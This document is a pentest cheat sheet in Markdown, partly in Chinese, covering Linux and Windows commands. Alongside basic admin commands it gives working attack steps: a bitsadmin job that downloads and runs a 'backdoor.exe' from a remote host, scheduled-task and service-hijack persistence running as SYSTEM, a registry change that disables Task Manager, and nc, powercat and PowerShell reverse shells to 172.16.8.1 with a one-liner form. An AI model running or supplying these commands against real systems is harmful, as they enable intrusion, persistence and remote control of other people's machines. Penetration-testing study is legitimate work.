# Basic Commands & Tools

## pentest process

A typical penetration test comprises the following stages:

- Defining the Scope
- Information Gathering
- Vulnerability Detection
- Initial Foothold
- Privilege Escalation
- Lateral Movement
- Reporting/Analysis
- Lessons Learned/Remediation

## Linux

### shell

#### find

```shell
touch root_auto_schedule.sh
sudo chown root root_auto_schedule.sh
sudo chmod o+w root_auto_schedule.sh
sudo find / -user root -type f -perm -o=w -iname '*.sh' 2>/dev/null
```

#### cat | cut | uniq | sort

```shell
cat access_log.txt | cut -d " " -f 1 | uniq -c | sort -run
```

---

#### ss

```shell
ss -aptu
```

## Windows

### cmd & powershell

powershell -ep bypass

#### systeminfo

```shell
systeminfo /s host1
```

#### set

```shell
echo %temp%
```

#### dir

```shell
dir /a
dir /s *.exe /p
```

#### forfiles

```shell
forfiles /p c:\windows /s /m notepad.exe /c "cmd /s echo @path @fdate @ftime"
```

#### attrib

```shell
attrib -h local_hide.txt
```

#### icaacls

```shell
icacls local_hide.txt /grant Everyone:F
```

### reg

reg 是Windows命令行和脚本中用来操纵注册表的命令。reg 命令的全称是 "Registry Editor" 的缩写，它允许用户在命令行界面中执行注册表操作，如添加、修改、删除注册表键和值。

注册表是Windows操作系统中一个重要的数据库，存储了系统设置和配置信息，包括硬件、软件、用户偏好和系统设置等。通过 reg 命令，可以直接对注册表进行查询和更改，这对于系统管理和故障排除非常有用。

```shell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg add "hkcu\software\microsoftware\windows\currentversion\policies\system" /v disabletaskmgr /t reg_dword /d "1" /f
```

### bitsadmin

bitsadmin是一个Windows命令行工具，用于管理后台智能传输服务（Background Intelligent Transfer Service，简称BITS）。BITS是一项Windows服务，允许文件在网络上以异步方式传输，通常用于在用户不注意的情况下传输文件，如Windows更新或其他应用程序的数据更新。

bitsadmin 工具提供了一系列的命令来创建、监视和控制BITS作业。作业是由一个或多个文件传输组成的，并且可以根据网络条件动态地调整速度，这样在网络使用率低的时候可以更快地传输数据，而在网络繁忙时则减慢速度，避免占用过多带宽。

```shell
bitsadmin /list /allusers /verbose
bitsadmin /info xxx /verbose

bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://1.1.1.1/backdoor.exe" "c:\windows\temp\backdoor.exe"
bitsadmin /SetNotifyCmdLine backdoor "cmd.exe /c c:\windows\temp\backdoor.exe" NULL
bitsadmin /Setminretrydelay backdoor 1
bitsadmin /resume backdoor
```

### certutil

certutil 是Windows命令行工具，用于管理证书服务和证书相关的操作。证书服务是Windows操作系统中的一个角色，用于创建和管理证书，以及为用户和计算机分发证书。

### schtasks

schtasks 是Windows操作系统中用来创建、删除、查询、更改和运行系统任务计划的命令行工具。任务计划可以用来定时运行脚本或程序，执行系统维护任务，或者自动执行重复的作业。

```shell
schtasks /create /tn 任务名称 /tr 任务运行的命令 /sc 计划类型 /mo 修饰参数 /d 天 /st 开始时间 /ru 运行用户
```

```shell
schtasks /query /fo LIST /v
schtasks /create /tn "backdoor" /tr "c:\windows\temp\backdoor.exe" /sc minute /mo 1 /ru "system"
schtasks /run /tn "backdoor"
```

### sc

sc 是Windows操作系统中用来管理服务的命令行工具。sc 命令可以用来创建、删除、查询、更改和控制服务，如启动、停止、暂停和恢复服务。

```shell
sc query wsearch
sc qc wsearch
sc config wsearch binpath= "cmd.exe /c c:\windows\temp\backdoor.exe"
sc start wsearch
```

### SysinternalsSuit

- PsInfo64.exe /accepteula

---

## Tools (reverse shell)

### nc

全场景，全平台，网络工具和实用程序的网络瑞士军刀。

```shell
nc 升级shell
python -c 'import pty;pty.spawn("/bin/bash")'

nc 反弹shell
nc 172.16.8.1 1234 -e /bin/bash
不支持-e参数
nc 172.16.8.1 1234 | /bin/bash | nc 72.16.8.1 2345
```

### powercat

```shell
powercat -c 172.16.8.1 -p 1234 -e cmd.exe
```

### powershell

reverse shell

```powershell
# 被控端
$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
}
$client.Close();

# 单行行式的代码
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

download file

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kali/binaries/nc.exe','c:\windows\temp\nc.exe')"
```
